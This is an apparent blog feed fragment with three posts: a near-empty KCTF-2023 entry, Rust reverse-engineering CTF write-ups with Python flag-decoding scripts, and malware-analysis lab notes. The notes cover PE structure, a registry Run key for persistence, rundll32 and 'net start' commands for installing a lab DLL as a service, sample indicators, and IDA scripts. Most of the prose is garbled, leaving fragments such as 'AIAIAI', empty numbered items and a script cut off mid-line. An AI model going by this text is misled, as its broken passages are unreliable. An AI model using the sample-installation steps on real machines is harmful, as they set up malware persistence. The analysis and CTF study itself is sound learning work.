    <content type="html"><![CDATA[<h1 id="KCTF-2023"><a href="#KCTF-2023" class="headerlink" title="KCTF-2023"></a>KCTF-2023</h1><span id="more"></span><p>github<a href="https://github.com/WD-2711/re_files/tree/main/KCTF-2023"></a></p><h2 id="-AI"><a href="#-AI" class="headerlink" title=" AI"></a> AI</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">AI....AI</span><br></pre></td></tr></table></figure><h2 id="-CN"><a href="#-CN" class="headerlink" title=" CN"></a> CN</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">22606215CN</span><br><span class="line"></span><br><span class="line">CN</span><br><span class="line"></span><br><span class="line">5CN......</span><br><span class="line"></span><br><span class="line">QQ8601428</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">1[1,-1,1,0][-1,1,-1,0]</span><br><span class="line">2 0  1/3</span><br><span class="line">2023/9/3 20:55]</span><br></pre></td></tr></table></figure><h2 id="-"><a href="#-" class="headerlink" title=" "></a> </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">30(AI)AI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[QQ8601428]</span><br></pre></td></tr></table></figure><h2 id="-AI"><a href="#-AI" class="headerlink" title=" AI"></a> AI</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">International Information Security CenterIISC3AICNSpaceXAI</span><br><span class="line"></span><br><span class="line">AIAI2AI</span><br></pre></td></tr></table></figure><h2 id="-"><a href="#-" class="headerlink" title=" "></a> </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AIAI48ok</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">[QQ8601428]</span><br><span class="line"></span><br><span class="line">2IISC</span><br></pre></td></tr></table></figure><h2 id="-"><a href="#-" class="headerlink" title=" "></a> </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Windows10Windows7Windows11]</span><br></pre></td></tr></table></figure><h2 id="-"><a href="#-" class="headerlink" title=" "></a> </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AIipAI</span><br><span class="line"></span><br><span class="line">AIIISCYoYoip</span><br><span class="line"></span><br><span class="line">[ &lt;WindowCrackMe &gt;  KCTF </span><br></pre></td></tr></table></figure><h2 id="-AI"><a href="#-AI" class="headerlink" title=" AI"></a> AI</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">100mAI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[ &lt;WindowCrackMe &gt;  KCTF ]</span><br></pre></td></tr></table></figure><h2 id="-"><a href="#-" class="headerlink" title=" "></a> </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">AI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AI</span><br></pre></td></tr></table></figure><h2 id="-"><a href="#-" class="headerlink" title=" "></a> </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">AI</span><br><span class="line"></span><br><span class="line">[linuxCentOS]</span><br><span class="line">[QQ8601428]</span><br></pre></td></tr></table></figure><h2 id="-"><a href="#-" class="headerlink" title=" "></a> </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AI724567813</span><br><span class="line"></span><br><span class="line">AIAIAIAI</span><br></pre></td></tr></table></figure><h2 id="-"><a href="#-" class="headerlink" title=" "></a> </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AI</span><br><span class="line"></span><br><span class="line">AI</span><br><span class="line"></span><br><span class="line">AIAIAIAIAIAI</span><br></pre></td></tr></table></figure><h2 id="-"><a href="#-" class="headerlink" title=" "></a> </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AIAIAI</span><br><span class="line"></span><br><span class="line">AIAIAI</span><br><span class="line"></span><br><span class="line">2265621CNAI.......</span><br></pre></td></tr></table></figure><p>To be continued</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;KCTF-2023&quot;&gt;&lt;a href=&quot;#KCTF-2023&quot; class=&quot;headerlink&quot; title=&quot;KCTF-2023&quot;&gt;&lt;/a&gt;KCTF-2023&lt;/h1&gt;</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>rust-rrrre</title>
    <link href="https://wd-2711.tech/2023/09/05/rust-rrrre/"/>
    <id>https://wd-2711.tech/2023/09/05/rust-rrrre/</id>
    <published>2023-09-05T02:02:02.000Z</published>
    <updated>2023-09-06T12:47:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="rust"><a href="#rust" class="headerlink" title="rust"></a>rust</h1><p>&emsp;StarctfSIMPLEX-WMMrustwp<a href="https://github.com/WD-2711/re_files/tree/main/rust-rrrre"></a></p><span id="more"></span><p>&emsp;Rust<a href="https://wsxk.github.io/Rust%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/">1</a></p><h2 id="0x00-beginnerrust"><a href="#0x00-beginnerrust" class="headerlink" title="0x00 beginnerrust"></a>0x00 beginnerrust</h2><p><img src="/images/rust-rrrre/image-20230905110015442.png" alt="image-20230905110015442" style="zoom:67%;" /></p><p>&emsp;<code>lea rcx, xxx</code><code>xxx</code>main</p><p><img src="/images/rust-rrrre/image-20230905110233161.png" alt="image-20230905110233161" style="zoom:67%;" /></p><p>&emsp;gdbpanic<code>read_line</code></p><p><img src="/images/rust-rrrre/image-20230905140246260.png" alt="image-20230905140246260" style="zoom:67%;" /></p><p>&emsp;<code>rsp+8</code><code>v28</code><code>rsp</code>get</p><p><img src="/images/rust-rrrre/image-20230905140644670.png" alt="image-20230905140644670" style="zoom:67%;" /></p><p>&emsp;<code>v28</code></p><p><img src="/images/rust-rrrre/image-20230905141221823.png" alt="image-20230905141221823" style="zoom:67%;" /></p><p>&emsp;char4</p><p><img src="/images/rust-rrrre/image-20230905143837578.png" alt="image-20230905143837578" style="zoom:67%;" /></p><p>&emsp;<code>0x7F</code></p><p><img src="/images/rust-rrrre/image-20230905144408580.png" alt="image-20230905144408580" style="zoom:67%;" /></p><p>&emsp;</p><p><img src="/images/rust-rrrre/image-20230905144701554.png" alt="image-20230905144701554" style="zoom:67%;" /></p><p>&emsp;<code>result</code>22</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line">addr = <span class="number">0x7FFFF7826000</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>):</span><br><span class="line">    flag.append((idc.get_wide_dword(addr+<span class="number">4</span>*i)&gt;&gt;<span class="number">2</span>)^<span class="number">0xa</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># INS&#123;y0ur_a_r3a1_h4rdc0r3_r3v3rs3r&#125;</span></span><br></pre></td></tr></table></figure><h2 id="0x01-checkin-rs"><a href="#0x01-checkin-rs" class="headerlink" title="0x01 checkin-rs"></a>0x01 checkin-rs</h2><p>&emsp;main</p><p><img src="/images/rust-rrrre/image-20230905152712996.png" alt="image-20230905152712996" style="zoom:67%;" /></p><p>&emsp;</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>std::thread::spawn::xxx</td><td></td></tr><tr><td>std::thread::JoinHandle</td><td></td></tr><tr><td>std::sync::mpsc::Receiver</td><td>mpscMultiple Producer Single Consumer</td></tr></tbody></table></div><p>&emsp;Receiver<code>v12</code>1</p><p><img src="/images/rust-rrrre/image-20230905164050033.png" alt="image-20230905164050033" style="zoom:67%;" /></p><p>&emsp;Sender  SyncSender  Receiver Sender<code>sync::mpsc::Sender$LT$T$GT$::send</code><code>sys_common::backtrace::__rust_begin_short_backtrace</code></p><p>&emsp;</p><p><img src="/images/rust-rrrre/image-20230905175301544.png" alt="image-20230905175301544" style="zoom:67%;" /></p><p>&emsp;xor</p><p><img src="/images/rust-rrrre/image-20230905182629815.png" alt="image-20230905182629815" style="zoom:67%;" /></p><p>&emsp;<code>flag^i</code></p><p><img src="/images/rust-rrrre/image-20230905182732017.png" alt="image-20230905182732017" style="zoom:67%;" /></p><p>&emsp;<code>bcmp</code></p><p><img src="/images/rust-rrrre/image-20230905180435241.png" alt="image-20230905180435241" style="zoom:67%;" /></p><p>&emsp;Sendera1a1<code>/rustc/897e37553bba8b42751c67658967889d11ecd120/library/std/src/thread/mod.rs</code></p><p>&emsp;<code>thread::spawn</code>a1</p><p><img src="/images/rust-rrrre/image-20230905185840243.png" alt="image-20230905185840243" style="zoom:67%;" /></p><p>&emsp;</p><p><img src="/images/rust-rrrre/image-20230905185939633.png" alt="image-20230905185939633" style="zoom:67%;" /></p><p>&emsp;j</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data1 = <span class="string">&quot;7A7D79536279566E726824252223207D&quot;</span></span><br><span class="line">data3 = <span class="string">&quot;7A68786E687F467B7F73767F7A7C4E62&quot;</span></span><br><span class="line">data2 = <span class="string">&quot;R~[PE@]LF\\ZHI^&quot;</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data1)//<span class="number">2</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    d = data1[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    d = <span class="built_in">int</span>(d, <span class="number">16</span>)</span><br><span class="line">    data.append(d)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data3)//<span class="number">2</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    d = data3[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    d = <span class="built_in">int</span>(d, <span class="number">16</span>)</span><br><span class="line">    data.append(d)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data2:</span><br><span class="line">    data.append(<span class="built_in">ord</span>(d))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    i = <span class="built_in">len</span>(data) - i - <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^data[i]), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># secpunk&#123;easy_reverse_checkin_rust_is_fun!!!!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-rvm"><a href="#0x02-rvm" class="headerlink" title="0x02 rvm"></a>0x02 rvm</h2><p>&emsp;2022rust+vm</p><p>&emsp;<code>beginner</code><code>main</code><code>sub_7C40</code><code>main</code><code>while..switch..case..</code></p><p>&emsp;8</p><p><img src="/images/rust-rrrre/image-20230906102228730.png" alt="image-20230906102228730" style="zoom:67%;" /></p><p>&emsp;wp</p><p></p><p>[1] <a href="https://wsxk.github.io/Rust%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/">https://wsxk.github.io/Rust%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</a></p><p>[2] <a href="https://www.cnblogs.com/Here-is-SG/p/17216822.html">https://www.cnblogs.com/Here-is-SG/p/17216822.html</a></p><p>[3] <a href="https://blog.fullstackpentest.com/a-rust-reverse-writeup.html">https://blog.fullstackpentest.com/a-rust-reverse-writeup.html</a></p><p>[4] <a href="https://www.xunflash.top/archives/rustvm.html">https://www.xunflash.top/archives/rustvm.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;rust&quot;&gt;&lt;a href=&quot;#rust&quot; class=&quot;headerlink&quot; title=&quot;rust&quot;&gt;&lt;/a&gt;rust&lt;/h1&gt;&lt;p&gt;&amp;emsp;StarctfSIMPLEX-WMMrustwp&lt;a href=&quot;https://github.com/WD-2711/re_files/tree/main/rust-rrrre&quot;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>malicious-code-analysis-1</title>
    <link href="https://wd-2711.tech/2023/08/28/malicious-code-analysis-1/"/>
    <id>https://wd-2711.tech/2023/08/28/malicious-code-analysis-1/</id>
    <published>2023-08-28T01:55:31.000Z</published>
    <updated>2023-10-11T05:41:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="-1"><a href="#-1" class="headerlink" title="-1"></a>-1</h1><p>&emsp;</p><span id="more"></span><h2 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h2><p>&emsp;</p><p>&emsp;</p><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>&emsp;</p><p>1</p><p>2</p><p>3</p><h2 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h2><p>&emsp;</p><p>1VirusTotal</p><p>2</p><p>3StringsASCIIUnicode</p><p>&emsp;<code>LoadLibrary</code><code>GetProcAddress</code>PEiDPEiD</p><p>&emsp;</p><p>1windows APIAPI<code>LoadLibrary</code><code>GetProcAddress</code><code>LdrGetProcAddress</code><code>LdrLoadDll</code><strong><code>Dependency Walker</code><code>PE view</code>PE<code>Resource Hacker</code>PE<code>.rsrc</code></strong></p><p>&emsp;dll</p><div class="table-container"><table><thead><tr><th>DLL</th><th></th></tr></thead><tbody><tr><td>kernel32.dll</td><td></td></tr><tr><td>advapi32.dll</td><td>windows<strong></strong><code>Software\Microsoft\Windows\CurrentVersion\Run</code>windows</td></tr><tr><td>user32.dll</td><td></td></tr><tr><td>gdi32.dll</td><td></td></tr><tr><td>ntdll.dll</td><td>windowsdllkernel32.dllntdll.dllwindows</td></tr><tr><td>wsock32.dllws2_32.dll</td><td>dll</td></tr><tr><td>wininet.dll</td><td>ftphttp</td></tr></tbody></table></div><p>&emsp;<code>Ex</code><code>CreateWindowEx</code></p><p>2exe</p><p>&emsp;PE</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>.text</td><td></td></tr><tr><td>.rdata</td><td></td></tr><tr><td>.data</td><td></td></tr><tr><td>.idata</td><td></td></tr><tr><td>.edata</td><td></td></tr><tr><td>.pdata</td><td>64</td></tr><tr><td>.rsrc</td><td></td></tr><tr><td>.reloc</td><td></td></tr></tbody></table></div><p>&emsp;windowsPEPE</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>&emsp;1. <code>Lab01-01.exe</code>55/71<code>Lab01-01.dll</code>44/70</p><p>&emsp;2. </p><p>&emsp;3. PE<code>Lab01-01.exe/dll</code></p><p>&emsp;4. <code>CreateFileA|CopyFileA|FindNextFileA|_stricmp</code></p><p>&emsp;5. <code>CopyFileA</code><code>C:\windows\system32\kerne132.dll</code><code>1</code><code>l</code></p><p>&emsp;6. dllip<code>127.26.152.13</code></p><p>&emsp;7. dllexedll</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>&emsp;1. <code>Lab01-02.exe</code>56/71</p><p>&emsp;2. UPX</p><p>&emsp;3. <code>CreateThread|WaiteForSingleObject|CreateServiceA|InternetOpenUrlA</code></p><p>&emsp;4. <code>http://www.malwareanalysisbook.com</code><code>Malservice</code><code>http://www.malwareanalysisbook.com</code></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>&emsp;1. <code>Lab01-03.exe</code>61/71</p><p>&emsp;2. <a href="https://www.52pojie.cn/thread-886615-1-1.html">FSG</a>x64dbg</p><p>&emsp;3. <code>OleInitialize|CoCreateInstance|VariantInit</code><code>ole32.dll</code>dll RPC</p><p>&emsp;4. <code>ole32.dll</code><code>oleaut32.dll</code>COMRPC</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>&emsp;1. <code>Lab01-04.exe</code>59/71</p><p>&emsp;2. </p><p>&emsp;3. <code>2019-08-31 06:26:59</code></p><p>&emsp;4. <code>LoadLibraryA|WinExec</code></p><p>&emsp;5. <code>\system32\wupdmgr.exe</code>URLURL</p><p>&emsp;6. GUI32 <code>Lab01-04.exe</code>GUI32</p><h2 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h2><p>&emsp;</p><p><img src="/images/malicious-code-analysis-1/image-20230924233603889.png" alt="image-20230924233603889" style="zoom:67%;" /></p><p>&emsp;</p><h2 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h2><p>&emsp;NormanGFI</p><p>&emsp;</p><h3 id="dll"><a href="#dll" class="headerlink" title="dll"></a>dll</h3><h4 id="1rundll32-exe"><a href="#1rundll32-exe" class="headerlink" title="1rundll32.exe"></a>1<code>rundll32.exe</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe dll_name, func_name</span><br><span class="line">rundll32.exe dll_name,  #5</span><br></pre></td></tr></table></figure><h4 id="2PE"><a href="#2PE" class="headerlink" title="2PE"></a>2PE</h4><p>&emsp;<code>IMAGE_FILE_HEADER</code><code>IMAGE_FILE_DLL(0x200)</code><code>DLLMain</code></p><h4 id="3dll"><a href="#3dll" class="headerlink" title="3dll"></a>3dll</h4><p>&emsp;dll<code>InstallService</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe dll_name, InstallService service_name</span><br><span class="line">// windows </span><br><span class="line">net start service_name</span><br></pre></td></tr></table></figure><p>&emsp;<code>InstallService</code><code>ServiceMain</code><code>HKLM\SYSTEM\CurrentControlSet\Services</code><code>net start</code></p><h3 id="-Process-Monitor"><a href="#-Process-Monitor" class="headerlink" title=" Process Monitor"></a> Process Monitor</h3><p>&emsp;windows<strong><code></code></strong><strong></strong>P41Process Monitorprocmon.exepagefile</p><p>&emsp;</p><h3 id="-Process-Explorer"><a href="#-Process-Explorer" class="headerlink" title=" Process Explorer"></a> Process Explorer</h3><p>&emsp;dll</p><p>&emsp;<code>-&gt;Image-&gt;Verify</code></p><p>&emsp;<code>-&gt;Strings-&gt;Image/Memory</code></p><p>&emsp;<code>Find-&gt;Find Handle or DLL</code>dlldll</p><p>&emsp;<code>-&gt;Image-&gt;path</code></p><h3 id="-RegShot"><a href="#-RegShot" class="headerlink" title=" RegShot"></a> RegShot</h3><p>&emsp;</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;<strong></strong></p><p>1ApateDNSDNSUDP53<strong>IPDNS</strong><code>www.baidu.com</code><code>192.168.1.1</code><code>NXDOMAIN</code>ip</p><p>2Netcat/<strong>netcat</strong></p><p>3Wireshark</p><p>4INetSimHTTPHTTPSFTPDNSINetSim</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;123RegShot4INetSimApateDNS5Wireshark</p><p>&emsp;</p><p><img src="/images/malicious-code-analysis-1/image-20230927190703285.png" alt="image-20230927190703285" style="zoom:67%;" /></p><p>&emsp;P55</p><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>&emsp;1. <code>ExitProcess</code></p><p><img src="/images/malicious-code-analysis-1/image-20230928123000193.png" alt="image-20230928123000193" style="zoom:67%;" /></p><p>&emsp;2-3. </p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p>&emsp;1. <code>Install</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe Lab03-02.dll, Install aaa</span><br></pre></td></tr></table></figure><p>&emsp;dllaaa<code>rundll32.exe Lab03-02.dll, installA aaa</code></p><p>&emsp;2. <code>net start aaa</code>12ntdll.exe</p><p>&emsp;3. <code>Lab03-02.dll</code></p><p>&emsp;4. pid</p><p>&emsp;60s5-6</p><h3 id="3-4"><a href="#3-4" class="headerlink" title="3-4"></a>3-4</h3><p>&emsp;3log4</p><p>&emsp;<code>svchost.exe</code><code>services.exe</code></p><h2 id="0x04-x86"><a href="#0x04-x86" class="headerlink" title="0x04 x86"></a>0x04 x86</h2><p>&emsp;</p><p>&emsp;6</p><p>1XORANDNOT</p><p>2</p><p>3opcode</p><p>4</p><p>5C/C++</p><p>6C#Perl.NETjava</p><p>&emsp;x86/x64/SPARC/PowerPC/MIPS/ARMx86PCx86</p><p>&emsp;x86</p><p><img src="/images/malicious-code-analysis-1/image-20231010215224592.png" alt="image-20231010215224592" style="zoom:67%;" /></p><ul><li>IP</li><li>ALU</li></ul><p>&emsp;</p><p><img src="/images/malicious-code-analysis-1/image-20231010215649324.png" alt="image-20231010215649324" style="zoom:67%;" /></p><p>&emsp;127.0.0.10x7F0000010x0100007F</p><p>&emsp;</p><p>1SFsignSF1TFx86</p><p>2pushaAXCXDXBXSPBPSIDI</p><p>3pushadEAXECXEDXEBXESPEBPESIEDI</p><p>&emsp;<code>push call Apush eipjmp Apush ebpmov ebp, esp</code><code>mov esp, ebppop ebpretpop eipjmp eip</code></p><p>&emsp;</p><p>1jajgjajg</p><p>2jbjljbjl</p><p>3joOF=1jsSF=1jecxzECX=0</p><p>&emsp;</p><p>1repe cmpsbEDIESIECX=0</p><p>2rep stosbALALEDIECX=0</p><p>3rep movsbESIEDIECX=0</p><p>4repne scasbEDIALECX=0</p><h2 id="0x05-IDA-pro"><a href="#0x05-IDA-pro" class="headerlink" title="0x05 IDA pro"></a>0x05 IDA pro</h2><p>&emsp;</p><p>&emsp;</p><p>&emsp;IdaEBP<code>Alt+P -&gt; BP based frame -&gt; 4 bytes for Saved Reg</code></p><p>&emsp;<code>IDA</code></p><p>&emsp;tool-use</p><p>&emsp;IDC</p><p>1IDCidaidc</p><p>2IDCauto</p><p>3PEiDKrypto ANALyzeridcida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="keyword">auto</span> slotidx;</span><br><span class="line">slotidx = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//  0x00403108  &quot;RIGNDAEL [S] [char]&quot;</span></span><br><span class="line"><span class="comment">// 0,0,0 </span></span><br><span class="line"><span class="comment">// slotidx+0 </span></span><br><span class="line">MarkPosition(<span class="number">0x00403108</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, slotidx+<span class="number">0</span>, <span class="string">&quot;RIGNDAEL [S] [char]&quot;</span>);</span><br><span class="line"><span class="comment">//  0x00403109 </span></span><br><span class="line">MakeComm(PrevNotTail(<span class="number">0x00403109</span>), <span class="string">&quot;RINDAEL [S] [char]\nRIJNDAEL(AES):SBOX(also used in other ciphers).&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;IDAPython</p><p>1idcidcidapython<code>idaapiidcidautils 3</code></p><p>2idbcall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ScreenEA </span></span><br><span class="line"><span class="comment"># SegStart(ScreenEA())  SegEnd(ScreenEA()) </span></span><br><span class="line"><span class="comment"># Heads(SegStart(ScreenEA()), SegEnd(ScreenEA())) </span></span><br><span class="line">heads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))</span><br><span class="line">functionCalls = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> heads:</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">if</span> GetMnem(i) == <span class="string">&quot;call&quot;</span>:</span><br><span class="line">        functionCalls.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> functionCalls:</span><br><span class="line">    <span class="comment"># CIC_ITEM  ITEM </span></span><br><span class="line">    <span class="comment"># 0xc7fdff </span></span><br><span class="line">    SetColor(i, CIC_ITEM, <span class="number">0xc7fdff</span>)</span><br></pre></td></tr></table></figure><h4 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h4><p>&emsp;1. 0x1000D02E</p><p>&emsp;2. 0x100163CC</p><p>&emsp;3. 9</p><p>&emsp;4. pics.praticalmalwareanalysis.com</p><p>&emsp;5. 23</p><p>&emsp;6. 1</p><p>&emsp;7. 0x10095B34</p><p>&emsp;8. shell</p><p>&emsp;9. sub_10003695dword_1008E5C4sub_10003695platformID2win7</p><p>&emsp;10. sub_100052A2+WorkTimeWorkTimesshell</p><p>&emsp;11. </p><p>&emsp;12. systemidGetSystemLanguage</p><p><img src="/images/malicious-code-analysis-1/image-20231011120149863.png" alt="image-20231011120149863" style="zoom:67%;" /></p><p>&emsp;13. </p><p>1View-&gt;Graph-&gt;User xrefs chart1</p><p><img src="/images/malicious-code-analysis-1/image-20231011133749190.png" alt="image-20231011133749190" style="zoom:67%;" /></p><p><img src="/images/malicious-code-analysis-1/image-20231011133758687.png" alt="image-20231011133758687" style="zoom:67%;" /></p><p>22</p><p>&emsp;14. 30s</p><p>&emsp;15. 216</p><p>&emsp;16. AF_INETSock_streamIPPROTO_TCPIDAuse standard symbolic constant</p><p>&emsp;17. </p><p><img src="/images/malicious-code-analysis-1/image-20231011131417839.png" alt="image-20231011131417839" style="zoom:67%;" /></p><p>&emsp;</p><p><img src="/images/malicious-code-analysis-1/image-20231011131454159.png" alt="image-20231011131454159" style="zoom:67%;" /></p><p>&emsp;18. </p><p>&emsp;19. ida7.7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> 